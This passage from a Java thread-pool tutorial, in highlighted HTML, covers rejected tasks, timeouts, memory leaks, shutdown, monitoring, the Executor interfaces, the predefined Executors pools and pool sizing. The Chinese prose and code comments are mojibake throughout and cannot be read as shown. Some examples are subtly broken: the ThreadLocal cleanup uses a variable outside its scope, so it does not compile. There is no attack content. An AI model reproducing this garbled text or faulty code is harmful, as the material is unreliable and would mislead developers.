        <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span>) {
            logger.error(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå¼‚å¸¸"</span>, t);
            <span class="hljs-comment">// å¯ä»¥å‘é€å‘Šè­¦ã€è®°å½•æ—¥å¿—ç­‰</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-46">1.13 çº¿ç¨‹æ± çš„å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ</h4>
<h5 data-id="heading-47">1.13.1 çº¿ç¨‹æ± æ»¡äº†æ€ä¹ˆåŠï¼Ÿ</h5>
<p><strong>é—®é¢˜ï¼š</strong> çº¿ç¨‹æ± æ»¡äº†ï¼Œæ–°ä»»åŠ¡è¢«æ‹’ç»ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å¢åŠ çº¿ç¨‹æ± å¤§å°</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,  <span class="hljs-comment">// å¢åŠ æ ¸å¿ƒçº¿ç¨‹æ•°å’Œæœ€å¤§çº¿ç¨‹æ•°</span>
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">200</span>)  <span class="hljs-comment">// å¢åŠ é˜Ÿåˆ—å®¹é‡</span>
);

<span class="hljs-comment">// 2. ä½¿ç”¨åˆé€‚çš„æ‹’ç»ç­–ç•¥</span>
executor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());

<span class="hljs-comment">// 3. ç›‘æ§çº¿ç¨‹æ± çŠ¶æ€ï¼ŒåŠæ—¶è°ƒæ•´</span>
<span class="hljs-type">ThreadPoolMonitor</span> <span class="hljs-variable">monitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolMonitor</span>(executor);
monitor.startMonitoring(<span class="hljs-number">1</span>, TimeUnit.MINUTES);
</code></pre>
<h5 data-id="heading-48">1.13.2 ä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡é•¿</h5>
<p><strong>é—®é¢˜ï¼š</strong> ä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡é•¿ï¼Œå ç”¨çº¿ç¨‹èµ„æºã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. ä½¿ç”¨Future.get()è®¾ç½®è¶…æ—¶</span>
Future&lt;String&gt; future = executor.submit(() -&gt; {
    <span class="hljs-comment">// é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡</span>
    <span class="hljs-keyword">return</span> processLongTask();
});

<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> future.get(<span class="hljs-number">30</span>, TimeUnit.SECONDS);  <span class="hljs-comment">// 30ç§’è¶…æ—¶</span>
} <span class="hljs-keyword">catch</span> (TimeoutException e) {
    future.cancel(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å–æ¶ˆä»»åŠ¡</span>
    logger.warn(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œè¶…æ—¶ï¼Œå·²å–æ¶ˆ"</span>);
}

<span class="hljs-comment">// 2. å°†é•¿æ—¶é—´ä»»åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªçŸ­ä»»åŠ¡</span>
executor.submit(() -&gt; {
    List&lt;Task&gt; tasks = splitLongTask();
    <span class="hljs-keyword">for</span> (Task task : tasks) {
        executor.submit(() -&gt; processTask(task));
    }
});
</code></pre>
<h5 data-id="heading-49">1.13.3 çº¿ç¨‹æ± å†…å­˜æ³„æ¼</h5>
<p><strong>é—®é¢˜ï¼š</strong> çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. ä½¿ç”¨ThreadLocalååŠæ—¶æ¸…ç†</span>
executor.execute(() -&gt; {
    <span class="hljs-keyword">try</span> {
        ThreadLocal&lt;String&gt; local = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();
        local.set(<span class="hljs-string">"value"</span>);
        <span class="hljs-comment">// ä½¿ç”¨ThreadLocal</span>
    } <span class="hljs-keyword">finally</span> {
        local.remove();  <span class="hljs-comment">// åŠæ—¶æ¸…ç†</span>
    }
});

<span class="hljs-comment">// 2. é¿å…åœ¨çº¿ç¨‹ä¸­æŒæœ‰å¤§å¯¹è±¡çš„å¼•ç”¨</span>
<span class="hljs-comment">// 3. å®šæœŸæ£€æŸ¥çº¿ç¨‹æ± çŠ¶æ€ï¼ŒåŠæ—¶å…³é—­ä¸ç”¨çš„çº¿ç¨‹æ± </span>
</code></pre>
<h5 data-id="heading-50">1.13.4 çº¿ç¨‹æ± æ— æ³•å…³é—­</h5>
<p><strong>é—®é¢˜ï¼š</strong> è°ƒç”¨<code>shutdown()</code>åï¼Œçº¿ç¨‹æ± æ— æ³•æ­£å¸¸å…³é—­ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. ç¡®ä¿æ‰€æœ‰ä»»åŠ¡éƒ½èƒ½æ­£å¸¸å®Œæˆ</span>
executor.execute(() -&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸ï¼Œé¿å…ä»»åŠ¡å¡ä½</span>
    }
});

<span class="hljs-comment">// 2. ä½¿ç”¨shutdownNow()å¼ºåˆ¶å…³é—­</span>
executor.shutdown();
<span class="hljs-keyword">if</span> (!executor.awaitTermination(<span class="hljs-number">60</span>, TimeUnit.SECONDS)) {
    executor.shutdownNow();
}

<span class="hljs-comment">// 3. æ£€æŸ¥æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…IOæ“ä½œ</span>
<span class="hljs-comment">// ç¡®ä¿IOæ“ä½œæœ‰è¶…æ—¶è®¾ç½®</span>
</code></pre>
<h4 data-id="heading-51">1.14 çº¿ç¨‹æ± çš„æœ€ä½³å®è·µ</h4>
<h5 data-id="heading-52">1.14.1 åˆ›å»ºçº¿ç¨‹æ± çš„æœ€ä½³å®è·µ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. ä½¿ç”¨æœ‰æ„ä¹‰çš„çº¿ç¨‹åç§°</span>
<span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomThreadFactory</span>(<span class="hljs-string">"OrderProcessPool"</span>);

<span class="hljs-comment">// 2. è®¾ç½®åˆç†çš„å‚æ•°</span>
<span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    cpuCount,                    <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°</span>
    cpuCount * <span class="hljs-number">2</span>,                <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
    <span class="hljs-number">60L</span>, TimeUnit.SECONDS,       <span class="hljs-comment">// çº¿ç¨‹å­˜æ´»æ—¶é—´</span>
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>),  <span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—</span>
    factory,                     <span class="hljs-comment">// è‡ªå®šä¹‰çº¿ç¨‹å·¥å‚</span>
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()  <span class="hljs-comment">// æ‹’ç»ç­–ç•¥</span>
);

<span class="hljs-comment">// 3. é¢„å¯åŠ¨æ ¸å¿ƒçº¿ç¨‹ï¼ˆå¯é€‰ï¼‰</span>
executor.prestartAllCoreThreads();
</code></pre>
<h5 data-id="heading-53">1.14.2 ä½¿ç”¨çº¿ç¨‹æ± çš„æœ€ä½³å®è·µ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. ä½¿ç”¨try-with-resourcesæˆ–ç¡®ä¿å…³é—­çº¿ç¨‹æ± </span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>)) {
    <span class="hljs-comment">// ä½¿ç”¨çº¿ç¨‹æ± </span>
}  <span class="hljs-comment">// è‡ªåŠ¨å…³é—­</span>

<span class="hljs-comment">// 2. æäº¤ä»»åŠ¡æ—¶å¤„ç†å¼‚å¸¸</span>
executor.submit(() -&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    } <span class="hljs-keyword">catch</span> (Exception e) {
        logger.error(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå¼‚å¸¸"</span>, e);
    }
});

<span class="hljs-comment">// 3. ä½¿ç”¨Future.get()æ—¶è®¾ç½®è¶…æ—¶</span>
Future&lt;String&gt; future = executor.submit(() -&gt; <span class="hljs-string">"ç»“æœ"</span>);
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> future.get(<span class="hljs-number">30</span>, TimeUnit.SECONDS);
} <span class="hljs-keyword">catch</span> (TimeoutException e) {
    future.cancel(<span class="hljs-literal">true</span>);
}
</code></pre>
<h5 data-id="heading-54">1.14.3 ç›‘æ§çº¿ç¨‹æ± çš„æœ€ä½³å®è·µ</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å®šæœŸç›‘æ§çº¿ç¨‹æ± çŠ¶æ€</span>
<span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">monitor</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">1</span>);
monitor.scheduleAtFixedRate(() -&gt; {
    ThreadPoolMonitor.printStatus(executor);
}, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TimeUnit.MINUTES);

<span class="hljs-comment">// 2. è®¾ç½®å‘Šè­¦é˜ˆå€¼</span>
<span class="hljs-keyword">if</span> (executor.getQueue().size() &gt; <span class="hljs-number">1000</span>) {
    alertService.sendAlert(<span class="hljs-string">"çº¿ç¨‹æ± é˜Ÿåˆ—ç§¯å‹ä¸¥é‡"</span>);
}

<span class="hljs-comment">// 3. è®°å½•çº¿ç¨‹æ± æŒ‡æ ‡</span>
metricsCollector.record(<span class="hljs-string">"threadpool.queue.size"</span>, executor.getQueue().size());
metricsCollector.record(<span class="hljs-string">"threadpool.active.count"</span>, executor.getActiveCount());
</code></pre>
<h4 data-id="heading-55">1.15 çº¿ç¨‹æ± çš„ç›‘æ§</h4>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç›‘æ§çº¿ç¨‹æ± çš„çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(...);

<span class="hljs-comment">// è·å–çº¿ç¨‹æ± çŠ¶æ€ä¿¡æ¯</span>
<span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> executor.getCorePoolSize();        <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°</span>
<span class="hljs-type">int</span> <span class="hljs-variable">maximumPoolSize</span> <span class="hljs-operator">=</span> executor.getMaximumPoolSize();   <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
<span class="hljs-type">int</span> <span class="hljs-variable">poolSize</span> <span class="hljs-operator">=</span> executor.getPoolSize();                <span class="hljs-comment">// å½“å‰çº¿ç¨‹æ•°</span>
<span class="hljs-type">int</span> <span class="hljs-variable">activeCount</span> <span class="hljs-operator">=</span> executor.getActiveCount();           <span class="hljs-comment">// æ­£åœ¨æ‰§è¡Œä»»åŠ¡çš„çº¿ç¨‹æ•°</span>
<span class="hljs-type">long</span> <span class="hljs-variable">completedTaskCount</span> <span class="hljs-operator">=</span> executor.getCompletedTaskCount(); <span class="hljs-comment">// å·²å®Œæˆçš„ä»»åŠ¡æ•°</span>
<span class="hljs-type">long</span> <span class="hljs-variable">taskCount</span> <span class="hljs-operator">=</span> executor.getTaskCount();             <span class="hljs-comment">// æ€»ä»»åŠ¡æ•°</span>
<span class="hljs-type">int</span> <span class="hljs-variable">queueSize</span> <span class="hljs-operator">=</span> executor.getQueue().size();           <span class="hljs-comment">// é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ•°</span>
<span class="hljs-type">int</span> <span class="hljs-variable">queueRemainingCapacity</span> <span class="hljs-operator">=</span> executor.getQueue().remainingCapacity(); <span class="hljs-comment">// é˜Ÿåˆ—å‰©ä½™å®¹é‡</span>
</code></pre>
<p><strong>ç›‘æ§æŒ‡æ ‡è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>poolSize</code>ï¼šå½“å‰çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°é‡</li>
<li><code>activeCount</code>ï¼šæ­£åœ¨æ‰§è¡Œä»»åŠ¡çš„çº¿ç¨‹æ•°é‡</li>
<li><code>completedTaskCount</code>ï¼šå·²å®Œæˆçš„ä»»åŠ¡æ•°é‡</li>
<li><code>taskCount</code>ï¼šæ€»ä»»åŠ¡æ•°é‡ï¼ˆå·²å®Œæˆ + æ­£åœ¨æ‰§è¡Œ + é˜Ÿåˆ—ä¸­ï¼‰</li>
<li><code>queueSize</code>ï¼šé˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ•°é‡</li>
<li><code>queueRemainingCapacity</code>ï¼šé˜Ÿåˆ—å‰©ä½™å®¹é‡</li>
</ul>
<h2 data-id="heading-56">2. Executoræ¡†æ¶</h2>
<h4 data-id="heading-57">2.1 Executoræ¡†æ¶æ¦‚è¿°</h4>
<p>Executoræ¡†æ¶æ˜¯Java 5å¼•å…¥çš„ï¼Œç”¨äºç®€åŒ–çº¿ç¨‹ç®¡ç†å’Œä»»åŠ¡æ‰§è¡Œçš„æ¡†æ¶ã€‚å®ƒæä¾›äº†çº¿ç¨‹æ± çš„å®ç°ï¼Œå°†ä»»åŠ¡çš„æäº¤å’Œæ‰§è¡Œè§£è€¦ã€‚</p>
<h5 data-id="heading-58">2.1.1 Executoræ¥å£</h5>
<p><code>Executor</code>æ¥å£æ˜¯æœ€é¡¶å±‚çš„æ¥å£ï¼Œåªå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Executor</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span>;
}
</code></pre>
<h5 data-id="heading-59">2.1.2 ExecutorServiceæ¥å£</h5>
<p><code>ExecutorService</code>æ¥å£æ‰©å±•äº†<code>Executor</code>æ¥å£ï¼Œæä¾›äº†æ›´ä¸°å¯Œçš„åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ExecutorService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Executor</span> {
    <span class="hljs-comment">// å…³é—­çº¿ç¨‹æ± </span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span>;
    List&lt;Runnable&gt; <span class="hljs-title function_">shutdownNow</span><span class="hljs-params">()</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isShutdown</span><span class="hljs-params">()</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isTerminated</span><span class="hljs-params">()</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">awaitTermination</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span>;
    
    <span class="hljs-comment">// æäº¤ä»»åŠ¡</span>
    &lt;T&gt; Future&lt;T&gt; <span class="hljs-title function_">submit</span><span class="hljs-params">(Callable&lt;T&gt; task)</span>;
    &lt;T&gt; Future&lt;T&gt; <span class="hljs-title function_">submit</span><span class="hljs-params">(Runnable task, T result)</span>;
    Future&lt;?&gt; submit(Runnable task);
    
    <span class="hljs-comment">// æ‰¹é‡æäº¤ä»»åŠ¡</span>
    &lt;T&gt; List&lt;Future&lt;T&gt;&gt; <span class="hljs-title function_">invokeAll</span><span class="hljs-params">(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks)</span>;
    &lt;T&gt; T <span class="hljs-title function_">invokeAny</span><span class="hljs-params">(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks)</span>;
}
</code></pre>
<h5 data-id="heading-60">2.1.3 ScheduledExecutorServiceæ¥å£</h5>
<p><code>ScheduledExecutorService</code>æ¥å£æ”¯æŒå®šæ—¶å’Œå‘¨æœŸæ€§ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ScheduledExecutorService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ExecutorService</span> {
    <span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œ</span>
    ScheduledFuture&lt;?&gt; schedule(Runnable command, <span class="hljs-type">long</span> delay, TimeUnit unit);
    
    <span class="hljs-comment">// å‘¨æœŸæ€§æ‰§è¡Œï¼ˆå›ºå®šå»¶è¿Ÿï¼‰</span>
    ScheduledFuture&lt;?&gt; scheduleAtFixedRate(Runnable command, 
                                         <span class="hljs-type">long</span> initialDelay, 
                                         <span class="hljs-type">long</span> period, 
                                         TimeUnit unit);
    
    <span class="hljs-comment">// å‘¨æœŸæ€§æ‰§è¡Œï¼ˆå›ºå®šé—´éš”ï¼‰</span>
    ScheduledFuture&lt;?&gt; scheduleWithFixedDelay(Runnable command, 
                                              <span class="hljs-type">long</span> initialDelay, 
                                              <span class="hljs-type">long</span> delay, 
                                              TimeUnit unit);
}
</code></pre>
<h4 data-id="heading-61">2.2 é¢„å®šä¹‰çº¿ç¨‹æ± </h4>
<p><code>Executors</code>ç±»æä¾›äº†å‡ ç§é¢„å®šä¹‰çš„çº¿ç¨‹æ± ï¼Œä½†<strong>ä¸æ¨èåœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨</strong>ï¼Œå› ä¸ºå®ƒä»¬çš„å‚æ•°è®¾ç½®å¯èƒ½ä¸é€‚åˆå®é™…åœºæ™¯ã€‚</p>
<h5 data-id="heading-62">2.2.1 newFixedThreadPool</h5>
<p>åˆ›å»ºå›ºå®šå¤§å°çš„çº¿ç¨‹æ± ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå›ºå®šå¤§å°ä¸º5çš„çº¿ç¨‹æ± </span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);

<span class="hljs-comment">// å†…éƒ¨å®ç°ï¼ˆä¸æ¨èç›´æ¥ä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    nThreads,                    <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•° = æœ€å¤§çº¿ç¨‹æ•°</span>
    nThreads,                    <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
    <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS,   <span class="hljs-comment">// çº¿ç¨‹ä¸å›æ”¶</span>
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;()  <span class="hljs-comment">// æ— ç•Œé˜Ÿåˆ—ï¼ˆå¯èƒ½å¯¼è‡´OOMï¼‰</span>
);
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong> ä½¿ç”¨æ— ç•Œé˜Ÿåˆ—ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æº¢å‡ºã€‚</p>
<h5 data-id="heading-63">2.2.2 newCachedThreadPool</h5>
<p>åˆ›å»ºå¯ç¼“å­˜çš„çº¿ç¨‹æ± ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå¯ç¼“å­˜çš„çº¿ç¨‹æ± </span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newCachedThreadPool();

<span class="hljs-comment">// å†…éƒ¨å®ç°ï¼ˆä¸æ¨èç›´æ¥ä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">0</span>,                           <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°ä¸º0</span>
    Integer.MAX_VALUE,           <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°æ— é™åˆ¶ï¼ˆå¯èƒ½å¯¼è‡´åˆ›å»ºè¿‡å¤šçº¿ç¨‹ï¼‰</span>
    <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousQueue</span>&lt;&gt;()     <span class="hljs-comment">// åŒæ­¥é˜Ÿåˆ—</span>
);
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong> æœ€å¤§çº¿ç¨‹æ•°æ— é™åˆ¶ï¼Œå¯èƒ½å¯¼è‡´åˆ›å»ºè¿‡å¤šçº¿ç¨‹ï¼Œè€—å°½ç³»ç»Ÿèµ„æºã€‚</p>
<h5 data-id="heading-64">2.2.3 newSingleThreadExecutor</h5>
<p>åˆ›å»ºå•çº¿ç¨‹çš„çº¿ç¨‹æ± ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå•çº¿ç¨‹çš„çº¿ç¨‹æ± </span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newSingleThreadExecutor();

<span class="hljs-comment">// å†…éƒ¨å®ç°</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;()  <span class="hljs-comment">// æ— ç•Œé˜Ÿåˆ—</span>
);
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong> ä½¿ç”¨æ— ç•Œé˜Ÿåˆ—ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æº¢å‡ºã€‚</p>
<h5 data-id="heading-65">2.2.4 newScheduledThreadPool</h5>
<p>åˆ›å»ºæ”¯æŒå®šæ—¶ä»»åŠ¡çš„çº¿ç¨‹æ± ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºæ”¯æŒå®šæ—¶ä»»åŠ¡çš„çº¿ç¨‹æ± </span>
<span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">5</span>);

<span class="hljs-comment">// å»¶è¿Ÿæ‰§è¡Œ</span>
executor.schedule(() -&gt; {
    System.out.println(<span class="hljs-string">"å»¶è¿Ÿæ‰§è¡Œçš„ä»»åŠ¡"</span>);
}, <span class="hljs-number">5</span>, TimeUnit.SECONDS);

<span class="hljs-comment">// å‘¨æœŸæ€§æ‰§è¡Œï¼ˆå›ºå®šé¢‘ç‡ï¼‰</span>
executor.scheduleAtFixedRate(() -&gt; {
    System.out.println(<span class="hljs-string">"å‘¨æœŸæ€§ä»»åŠ¡"</span>);
}, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TimeUnit.SECONDS);
</code></pre>
<h4 data-id="heading-66">2.3 çº¿ç¨‹æ± çš„åˆç†é…ç½®</h4>
<h5 data-id="heading-67">2.3.1 CPUå¯†é›†å‹ä»»åŠ¡</h5>
<p>CPUå¯†é›†å‹ä»»åŠ¡ä¸»è¦æ¶ˆè€—CPUèµ„æºï¼Œçº¿ç¨‹æ•°åº”è¯¥è®¾ç½®ä¸ºCPUæ ¸å¿ƒæ•°+1ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
<span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> cpuCount + <span class="hljs-number">1</span>;

<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    threadCount,      <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°</span>
    threadCount,      <span class="hljs-comment">// æœ€å¤§çº¿ç¨‹æ•°</span>
    <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);
</code></pre>
<h5 data-id="heading-68">2.3.2 IOå¯†é›†å‹ä»»åŠ¡</h5>
<p>IOå¯†é›†å‹ä»»åŠ¡ä¸»è¦ç­‰å¾…IOæ“ä½œï¼ˆå¦‚ç½‘ç»œè¯·æ±‚ã€æ–‡ä»¶è¯»å†™ï¼‰ï¼Œçº¿ç¨‹æ•°å¯ä»¥è®¾ç½®å¾—æ›´å¤§ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹æ•° = CPUæ ¸å¿ƒæ•° * (1 + IOç­‰å¾…æ—¶é—´ / CPUè®¡ç®—æ—¶é—´)</span>
<span class="hljs-comment">// ä¸€èˆ¬å¯ä»¥è®¾ç½®ä¸º CPUæ ¸å¿ƒæ•° * 2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
<span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> cpuCount * <span class="hljs-number">2</span>;

<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    threadCount,
    threadCount * <span class="hljs-number">2</span>,
    <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);
</code></pre>
<h5 data-id="heading-69">2.3.3 æ··åˆå‹ä»»åŠ¡</h5>
<p>å¯¹äºæ··åˆå‹ä»»åŠ¡ï¼Œå¯ä»¥æ ¹æ®ä»»åŠ¡çš„ç‰¹ç‚¹æ¥è°ƒæ•´çº¿ç¨‹æ•°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ ¹æ®å®é™…åœºæ™¯è°ƒæ•´</span>
<span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();
<span class="hljs-type">int</span> <span class="hljs-variable">coreThreads</span> <span class="hljs-operator">=</span> cpuCount;
<span class="hljs-type">int</span> <span class="hljs-variable">maxThreads</span> <span class="hljs-operator">=</span> cpuCount * <span class="hljs-number">2</span>;

<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    coreThreads,
    maxThreads,
    <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);
</code></pre>
<h4 data-id="heading-70">2.4 Futureä¸Callable</h4>
<h5 data-id="heading-71">2.4.1 Callableæ¥å£</h5>
<p><code>Callable</code>æ¥å£ç±»ä¼¼äº<code>Runnable</code>ï¼Œä½†å¯ä»¥è¿”å›ç»“æœå’ŒæŠ›å‡ºå¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Callable</span>&lt;V&gt; {
